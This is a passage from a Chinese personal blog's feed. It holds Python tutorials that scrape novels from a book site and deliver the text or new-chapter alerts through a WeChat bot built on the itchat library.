class="string">r'&lt;li&gt;&lt;a href="(.*?)" title="(.*?)"&gt;.*?&lt;/a&gt;&lt;/li&gt;'</span>,response)</span><br><span class="line">        <span class="comment">#总章数</span></span><br><span class="line">        self.len = len(self.contents)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">location2res</span><span class="params">(self,location)</span>:</span></span><br><span class="line">        flag = <span class="number">-1</span></span><br><span class="line">        self.res = requests.get(location,headers=self.headers).content.decode(<span class="string">'gbk'</span>)</span><br><span class="line">        author = re.findall(<span class="string">r'&lt;meta property="og:novel:author" content="(.*?)"'</span>,self.res)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> self.book_author == author:</span><br><span class="line">            flag = <span class="number">1</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                self.description = re.findall(<span class="string">r'介绍:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;(.*?)&lt;/div&gt;'</span>,self.res,re.S)[<span class="number">0</span>].replace(<span class="string">'&amp;nbsp;'</span>,<span class="string">''</span>).replace(<span class="string">'&lt;br /&gt;'</span>,<span class="string">''</span>)</span><br><span class="line">            <span class="keyword">except</span> IndexError:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">save</span><span class="params">(self)</span>:</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="comment">#开始写入文件</span></span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'./book/suqir.txt'</span>,<span class="string">'w'</span>,encoding=<span class="string">'utf-8'</span>,errors=<span class="string">'ignore'</span>) <span class="keyword">as</span> text_save:</span><br><span class="line">            text_save.write(self.book_name+<span class="string">'\n作者：'</span>+self.book_author)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'self.description'</span> <span class="keyword">in</span> dir():</span><br><span class="line">                text_save.write(<span class="string">'\n简介：'</span>+self.description)</span><br><span class="line">            text_save.write(<span class="string">'\n'</span>)</span><br><span class="line">            <span class="keyword">for</span> num <span class="keyword">in</span> self.contents:</span><br><span class="line">                <span class="comment">#获取单章文本</span></span><br><span class="line">                text_r = requests.get(num[<span class="number">0</span>],headers=self.headers)</span><br><span class="line">                text_c = text_r.content</span><br><span class="line">                text = text_c.decode(<span class="string">'gb18030'</span>)</span><br><span class="line">                <span class="comment">#获取章节名</span></span><br><span class="line">                title = num[<span class="number">1</span>].replace(re.findall(<span class="string">r'，共\d*字'</span>,num[<span class="number">1</span>])[<span class="number">0</span>],<span class="string">''</span>)</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="comment">#正则匹配内容</span></span><br><span class="line">                    text = re.findall(<span class="string">r'&lt;/script&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;(.*?)&lt;script type="text/javascript"&gt;'</span>,text,re.S)[<span class="number">0</span>]</span><br><span class="line">                    <span class="comment">#数据清洗</span></span><br><span class="line">                    text = text.replace(<span class="string">'&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;'</span>,<span class="string">''</span>)</span><br><span class="line">                    text = text.replace(<span class="string">'&lt;br /&gt;'</span>,<span class="string">''</span>)</span><br><span class="line">                    text = text.replace(<span class="string">'\r\n\r\n'</span>,<span class="string">'\r\n'</span>)</span><br><span class="line"></span><br><span class="line">                    text_save.write(<span class="string">'\n'</span>)</span><br><span class="line">                    text_save.write(title)</span><br><span class="line">                    text_save.write(<span class="string">'\n\n'</span>)</span><br><span class="line">                    text_save.write(text)</span><br><span class="line">                    text_save.write(<span class="string">'\n'</span>)</span><br><span class="line">                    print(<span class="string">'[*]%-30s\t完成度%.3f%%'</span>%(title,(i+<span class="number">1</span>) * <span class="number">100</span> / self.len))</span><br><span class="line">                    i += <span class="number">1</span></span><br><span class="line">                <span class="keyword">except</span> IndexError <span class="keyword">as</span> e:</span><br><span class="line">                    print(<span class="string">'【*】%s下载失败'</span>%title)</span><br><span class="line">            text_save.write(<span class="string">'\n===全书完===\n==by苏乞儿==\n'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_bookname</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.book_name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_bookauthor</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.book_author</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_des</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> self.description</span><br><span class="line">        <span class="keyword">except</span> AttributeError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'无简介'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_centents</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.len</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_booklink</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.booklink</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUserName</span><span class="params">()</span>:</span></span><br><span class="line">    itchat.auto_login(hotReload=<span class="keyword">True</span>,enableCmdQR=<span class="number">2</span>)</span><br><span class="line">    onlyUser = itchat.search_friends(name=<span class="string">'杰帅'</span>)</span><br><span class="line">    <span class="keyword">return</span> onlyUser[<span class="number">0</span>][<span class="string">'UserName'</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">@itchat.msg_register([TEXT],isFriendChat=True)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">text_reply</span><span class="params">(msg)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> userName</span><br><span class="line">    <span class="keyword">if</span> msg[<span class="string">'FromUserName'</span>] == userName:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            bookName,bookAuthor = msg[<span class="string">'Text'</span>].split(<span class="string">'suqir'</span>)</span><br><span class="line">            book = BookSpyder(bookName,bookAuthor)</span><br><span class="line">            itchat.send(<span class="string">'书名：%s\n作者：%s\n简介：%s'</span> % (bookName,bookAuthor,book.get_des()),toUserName=userName)</span><br><span class="line">            itchat.send(<span class="string">'正在爬取《%s》...'</span> % bookName,toUserName=userName)</span><br><span class="line">            print(<span class="string">'[*]正在爬取《%s》...'</span> % bookName)</span><br><span class="line">            book.save()</span><br><span class="line">            itchat.send(<span class="string">'爬取完毕！是否下载？(是/否)'</span>,toUserName=userName)</span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            <span class="keyword">if</span> msg[<span class="string">'Text'</span>] == <span class="string">'是'</span>:</span><br><span class="line">                print(<span class="string">'[*]正在发送文件...'</span>)</span><br><span class="line">                itchat.send(<span class="string">'正在上传...'</span>,toUserName=userName)</span><br><span class="line">                itchat.send_file(<span class="string">'./book/suqir.txt'</span>,toUserName=userName)</span><br><span class="line">                print(<span class="string">'[*]已发送文件！\n等待下次请求...'</span>)</span><br><span class="line">                itchat.send(<span class="string">'感谢使用！'</span>,toUserName=userName)</span><br><span class="line">            <span class="keyword">elif</span> msg[<span class="string">'Text'</span>] == <span class="string">'否'</span>:</span><br><span class="line">                itchat.send(<span class="string">'已取消，感谢使用！'</span>,toUserName=userName)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(<span class="string">'[*]Starting...'</span>)</span><br><span class="line">    userName = getUserName()</span><br><span class="line">    itchat.run()</span><br></pre></td></tr></table></figure><h1 id="运行部分截图"><a href="#运行部分截图" class="headerlink" title="运行部分截图"></a>运行部分截图</h1><h2 id="服务器端"><a href="#服务器端" class="headerlink" title="服务器端"></a>服务器端</h2><p><img src="/2018/12/15/爬取某书网指定小说-微信版/server.jpg" alt="服务器"></p><h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><p><img src="/2018/12/15/爬取某书网指定小说-微信版/vx.jpg" alt="微信"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;服务器版的小说爬虫，并借助python的itchat库实现微信对话式小说下载服务&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Python" scheme="https://blog.suqir.xyz/categories/Python/"/>
    
    
  </entry>
  
  <entry>
    <title>利用微信实现小说更新提醒</title>
    <link href="https://blog.suqir.xyz/2018/11/26/%E5%88%A9%E7%94%A8%E5%BE%AE%E4%BF%A1%E5%AE%9E%E7%8E%B0%E5%B0%8F%E8%AF%B4%E6%9B%B4%E6%96%B0%E6%8F%90%E9%86%92/"/>
    <id>https://blog.suqir.xyz/2018/11/26/%E5%88%A9%E7%94%A8%E5%BE%AE%E4%BF%A1%E5%AE%9E%E7%8E%B0%E5%B0%8F%E8%AF%B4%E6%9B%B4%E6%96%B0%E6%8F%90%E9%86%92/</id>
    <published>2018-11-26T11:13:52.000Z</published>
    <updated>2020-03-18T10:47:16.997Z</updated>
    
    <content type="html"><![CDATA[<p>人生最痛苦的事莫过于小说断更！这篇文章将对这一问题给出一种Python+阿里云+微信的解决方法<br><a id="more"></a><br>不过世界总是需要懒人的，因为有了懒人创造世界。这话不是我说的，是马爸爸说的：</p><blockquote><p>懒不是傻懒，如果你想少干，就要想出懒的方法。要懒出风格，懒出境界。——马云</p></blockquote><p>为此我专门买了一台服务器（9.9还包邮哦），反正以后还有很多地方用到服务器。</p><p>扯远了。。。利用服务器可以干很多事，比如接下来的利用微信第三方python库实现小说更新时通过微信将更新内容发给指定朋友。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> time,itchat</span><br><span class="line"> <span class="comment"># 微信登录</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vxLogin</span><span class="params">(rename)</span>:</span></span><br><span class="line">    <span class="comment"># enableCmdQR：在命令行中显示登录二维码，参数2是Linux系统下的字符宽度</span></span><br><span class="line">    itchat.auto_login(hotReload=<span class="keyword">True</span>,enableCmdQR=<span class="number">2</span>)</span><br><span class="line">    friends = itchat.get_friends(update=<span class="keyword">True</span>)</span><br><span class="line">    <span class="keyword">for</span> friend <span class="keyword">in</span> reversed(friends):</span><br><span class="line">        <span class="keyword">if</span> friend[<span class="string">'RemarkName'</span>] == rename:</span><br><span class="line">            toName = friend[<span class="string">'UserName'</span>]</span><br><span class="line">            <span class="keyword">return</span> toName</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查更新</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span><span class="params">(url,start,toName)</span>:</span></span><br><span class="line">    <span class="keyword">import</span> requests,re</span><br><span class="line">    res = requests.get(url).content.decode(<span class="string">'gb18030'</span>)</span><br><span class="line">    lis = re.findall(<span class="string">r'&lt;li&gt;&lt;a href="(.*?)" title="(.*?)，.*?"&gt;'</span>,res)</span><br><span class="line">    toName = vxLogin(rename=toName)</span><br><span class="line">    <span class="keyword">for</span> li <span class="keyword">in</span> lis[start:]:</span><br><span class="line">        end_str = li[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            end = int(re.findall(<span class="string">r'第[ ]?(.*?)[ ]?章'</span>,end_str)[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            print(<span class="string">'[*]小说更新了，但是章节序号为中文，我暂时不想处理。。。'</span>) <span class="comment">#碰到这种情况再更新，懒</span></span><br><span class="line">            exit()</span><br><span class="line">        <span class="keyword">if</span> end &gt;= start+<span class="number">1</span>:</span><br><span class="line">            text = requests.get(li[<span class="number">0</span>]).content.decode(<span class="string">'gbk'</span>)</span><br><span class="line">            re_text = re.findall(<span class="string">r'&lt;/script&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;(.*?)&lt;script'</span>,text,re.S)[<span class="number">0</span>]</span><br><span class="line">            re_text = re_text.replace(<span class="string">'&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;'</span>,<span class="string">''</span>)</span><br><span class="line">            re_text = re_text.replace(<span class="string">'&lt;br /&gt;'</span>,<span class="string">''</span>)</span><br><span class="line">            re_text = re_text.replace(<span class="string">'\r\n\r\n'</span>,<span class="string">'\r\n'</span>)</span><br><span class="line">            re_text = <span class="string">'%s\n%s\n\n'</span> %(li[<span class="number">1</span>],re_text)</span><br><span class="line">            print(<span class="string">'更新：%s'</span> % li[<span class="number">1</span>])</span><br><span class="line">            text = <span class="string">'最近更新了第%s章\n%s'</span> % (end,re_text)</span><br><span class="line">            length = len(text)//<span class="number">3</span></span><br><span class="line">            <span class="comment"># 分3段发送</span></span><br><span class="line">            itchat.send(msg=text[:length], toUserName=toName)</span><br><span class="line">            itchat.send(msg=text[length:(length*<span class="number">2</span>)], toUserName=toName)</span><br><span class="line">            itchat.send(msg=text[(length*<span class="number">2</span>):], toUserName=toName)</span><br><span class="line">            time.sleep(<span class="number">5</span>)</span><br><span class="line">    print(<span class="string">'[*]更新完成！暂无最新章节'</span>)</span><br><span class="line">    <span class="comment"># 声明startNum为全局变量，这样就不会在这个函数内部新建变量</span></span><br><span class="line">    <span class="keyword">global</span> startNum</span><br><span class="line">    startNum = end</span><br><span class="line">    time.sleep(<span class="number">3600</span>)<span class="comment"># 1小时更新检查一次</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(<span class="string">'[*]Starting...'</span>)</span><br><span class="line">    <span class="comment"># 当前最新章节</span></span><br><span class="line">    startNum = <span class="number">410</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">       update(url=<span class="string">'http://www.quanshuwang.cn/book/137/137120'</span>,start=startNum,toName=<span class="string">'杰帅'</span>)<span class="comment"># toName为None时发给自己</span></span><br><span class="line">    <span class="comment"># 持续运行</span></span><br><span class="line">    itchat.run()</span><br></pre></td></tr></table></figure><p>这里的url<code>http://www.quanshuwang.cn/book/137/137120</code>是我看的<code>《一步偷天》</code>在全书网的网址</p><h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><h3 id="服务器端："><a href="#服务器端：" class="headerlink" title="服务器端："></a>服务器端：</h3><p><img src="/2018/11/26/利用微信实现小说更新提醒/server.png" alt="服务器"></p><h3 id="微信端："><a href="#微信端：" class="headerlink" title="微信端："></a>微信端：</h3><p><img src="/2018/11/26/利用微信实现小说更新提醒/weixin.jpg" alt="微信"></p><p>小说也看完了，终于又可以开始写bug了！！</p><hr><p>另外，这个博客只作分享交流技术用，大爷们不用<strong>打赏</strong>，真的不用，真的不用，（疯狂暗示中…）</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;人生最痛苦的事莫过于小说断更！这篇文章将对这一问题给出一种Python+阿里云+微信的解决方法&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Python" scheme="https://blog.suqir.xyz/categories/Python/"/>
    
    
  </entry>
  
  <entry>
    <title>爬取某书网指定小说</title>
    <link href="https://blog.suqir.xyz/2018/11/07/%E7%88%AC%E5%8F%96%E6%9F%90%E4%B9%A6%E7%BD%91%E6%8C%87%E5%AE%9A%E5%B0%8F%E8%AF%B4/"/>
    <id>https://blog.suqir.xyz/2018/11/07/%E7%88%AC%E5%8F%96%E6%9F%90%E4%B9%A6%E7%BD%91%E6%8C%87%E5%AE%9A%E5%B0%8F%E8%AF%B4/</id>
    <published>2018-11-07T08:11:11.000Z</published>
    <updated>2020-03-18T10:47:23.901Z</updated>
    
    <content type="html"><![CDATA[<p>初探Python - 用Python实现对小说的爬取并下载<br><a id="more"></a></p><h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>最近看了一部基于小说改编的电视剧，闲的无聊就去看了看小说。但是大多数看书网站都有或多或少的广告，强迫症表示很难受，加之近来正在学习Python，便想着利用Python爬取小说的内容，远离广告的‘宠信’。</p><h1 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h1><p>程序实现原理很简单，将用户输入的书名提交到全书网进行搜索，将返回的结果存在list中并展示给用户，对用户选择的书籍进行书籍内容的爬取，并写入文件。</p><h1 id="存在的问题"><a href="#存在的问题" class="headerlink" title="存在的问题"></a>存在的问题</h1><p>初次学习写这种爬虫，代码难免冗余难读，但关键部分均写有注释，在此分享出来以作交流。<br>在实际操作过程中也遇到不少问题，比如：如果所查询的书籍在全书网中只有唯一的一本，全书网将直接通过location进行重定向到书籍详情页，与多本书的处理方式不一致，所以为了完美的获取书记简介必须写个if判断；再如：用户提交的书名必须经过gb2312编码并转urlencoding后才能查询到，否则服务器返回错误。。。不过，也可能是我第一次写，有更好的处理方法，希望自己继续努力吧！</p><h1 id="源代码："><a href="#源代码：" class="headerlink" title="源代码："></a>源代码：</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests,sys,re</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bookspider</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">"""爬取全书网指定书籍并下载到本地"""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        super(Bookspider, self).__init__()</span><br><span class="line">        self.request = requests.session()</span><br><span class="line">        self.headers = &#123;</span><br><span class="line">            <span class="comment">#随机指定user-agent</span></span><br><span class="line">            <span class="string">'User-Agent'</span>: <span class="string">'User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36'</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">book_search</span><span class="params">(self,name)</span>:</span></span><br><span class="line">        print(<span class="string">'[*]搜索中...'</span>)</span><br><span class="line">        <span class="comment">#全书网的搜索url</span></span><br><span class="line">        <span class="comment">#对name进行url编码：urllib.request.quote</span></span><br><span class="line">        self.url = <span class="string">'http://www.quanshuwang.com/modules/article/search.php?searchkey='</span>+urllib.request.quote(name.encode(<span class="string">'gb2312'</span>))+<span class="string">'&amp;searchtype=articlename&amp;searchbuttom.x=88&amp;searchbuttom.y=22'</span></span><br><span class="line">        <span class="comment">#禁止重定向：allow_redirects=False</span></span><br><span class="line">        search_data = self.request.get(self.url,headers=self.headers,allow_redirects=<span class="keyword">False</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment">#所爬书籍唯一时被重定向到location</span></span><br><span class="line">            self.location = search_data.headers[<span class="string">'location'</span>]</span><br><span class="line">            <span class="comment">#将str的location转换成list，方便计算length</span></span><br><span class="line">            self.location = self.location.split()</span><br><span class="line">        <span class="keyword">except</span> KeyError <span class="keyword">as</span> e:</span><br><span class="line">            response = search_data.content.decode(<span class="string">'gbk'</span>)</span><br><span class="line">            <span class="comment">#所爬书籍有多种结果时，返回所有书籍信息</span></span><br><span class="line">            self.location = re.findall(<span class="string">r'&lt;li&gt;&lt;a target="_blank" href="(.*?)".*?title="(.*?)".*&gt;(.*?)&lt;/a&gt;&lt;em class=.*?&gt;(.*?)&lt;a href='</span>,response)</span><br><span class="line">        <span class="keyword">return</span> self.location</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">book_info</span><span class="params">(self)</span>:</span></span><br><span class="line">        res = requests.get(self.location,headers=self.headers).content.decode(<span class="string">'gbk'</span>)</span><br><span class="line">        <span class="comment">#正则匹配书名</span></span><br><span class="line">        self.bookname = re.findall(<span class="string">r'&lt;meta property="og:title" content="(.*?)"/&gt;'</span>,res)[<span class="number">0</span>]</span><br><span class="line">        <span class="comment">#正则匹配书籍作者</span></span><br><span class="line">        self.author = re.findall(<span class="string">r'&lt;meta property="og:novel:author" content="(.*?)"/&gt;'</span>,res)[<span class="number">0</span>]</span><br><span class="line">        <span class="comment">#正则匹配书记简介  re.S指定多行匹配</span></span><br><span class="line">        self.description = re.findall(<span class="string">r'&lt;meta property="og:description" content="(.*?)"/&gt;'</span>,res,re.S)[<span class="number">0</span>].replace(<span class="string">'&amp;nbsp;'</span>,<span class="string">''</span>).replace(<span class="string">'&lt;br /&gt;'</span>,<span class="string">''</span>).replace(<span class="string">' '</span>,<span class="string">''</span>)</span><br><span class="line">        <span class="comment">#正则匹配书籍目录</span></span><br><span class="line">        self.booklink = re.findall(<span class="string">r'class="leftso png_bg"&gt;&lt;a href="(.*?)"'</span>,res)[<span class="number">0</span>]</span><br><span class="line">        response = requests.get(self.booklink,headers=self.headers).content.decode(<span class="string">'gbk'</span>)</span><br><span class="line">        <span class="comment">#正则匹配所有章节及其链接</span></span><br><span class="line">        self.contents = re.findall(<span class="string">r'&lt;li&gt;&lt;a href="(.*?)" title="(.*?)"&gt;.*?&lt;/a&gt;&lt;/li&gt;'</span>,response)</span><br><span class="line">        <span class="comment">#总章数</span></span><br><span class="line">        self.len = len(self.contents)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">save</span><span class="params">(self)</span>:</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#开始写入文件</span></span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'%s.txt'</span>%self.bookname,<span class="string">'w'</span>,encoding=<span class="string">'utf-8'</span>,errors=<span class="string">'ignore'</span>) <span class="keyword">as</span> text_save:</span><br><span class="line">            text_save.write(self.bookname+<span class="string">'\n作者：'</span>+self.author)</span><br><span class="line">            text_save.write(<span class="string">'\n简介：'</span>+self.description)</span><br><span class="line">            text_save.write(<span class="string">'\n'</span>)</span><br><span class="line">            <span class="keyword">for</span> num <span class="keyword">in</span> self.contents:</span><br><span class="line">                <span class="comment">#获取单章文本</span></span><br><span class="line">                text_r = requests.get(num[<span class="number">0</span>],headers=self.headers)</span><br><span class="line">                text_c = text_r.content</span><br><span class="line">                text = text_c.decode(<span class="string">'gbk'</span>)</span><br><span class="line">                <span class="comment">#获取章节名</span></span><br><span class="line">                title = num[<span class="number">1</span>].replace(re.findall(<span class="string">r'，共\d*字'</span>,num[<span class="number">1</span>])[<span class="number">0</span>],<span class="string">''</span>)</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="comment">#正则匹配内容</span></span><br><span class="line">                    text = re.findall(<span class="string">r'&lt;/script&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;(.*?)&lt;script type="text/javascript"&gt;'</span>,text,re.S)[<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">except</span> IndexError <span class="keyword">as</span> e:</span><br><span class="line">                    print(<span class="string">'【**】%s下载失败'</span>%title)</span><br><span class="line">                <span class="comment">#数据清洗</span></span><br><span class="line">                text = text.replace(<span class="string">'&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;'</span>,<span class="string">''</span>)</span><br><span class="line">                text = text.replace(<span class="string">'&lt;br /&gt;'</span>,<span class="string">''</span>)</span><br><span class="line">                text = text.replace(<span class="string">'\r\n\r\n'</span>,<span class="string">'\r\n'</span>)</span><br><span class="line"></span><br><span class="line">                text_save.write(<span class="string">'\n'</span>)</span><br><span class="line">                text_save.write(title)</span><br><span class="line">                text_save.write(<span class="string">'\n\n'</span>)</span><br><span class="line">                text_save.write(text)</span><br><span class="line">                text_save.write(<span class="string">'\n'</span>)</span><br><span class="line">                print(<span class="string">'[*]%-30s\t完成度%.3f%%'</span>%(title,(i+<span class="number">1</span>) * <span class="number">100</span> / self.len))</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">            text_save.write(<span class="string">'\n===全书完===\n==by苏乞儿==\n'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_item</span><span class="params">(self)</span>:</span></span><br><span class="line">        item =  len(self.location)</span><br><span class="line">        <span class="keyword">return</span> item</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set_location</span><span class="params">(self,location)</span>:</span></span><br><span class="line">        self.location = location</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_bookname</span><span class="params">(self)</span>:</span></span><br><span class="line">            <span class="keyword">return</span> self.bookname</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_author</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.author</span><br><span class="line"></span><br><span class="line">    <span class="comment">#获取总章数</span></span><br><span class="line">    <span 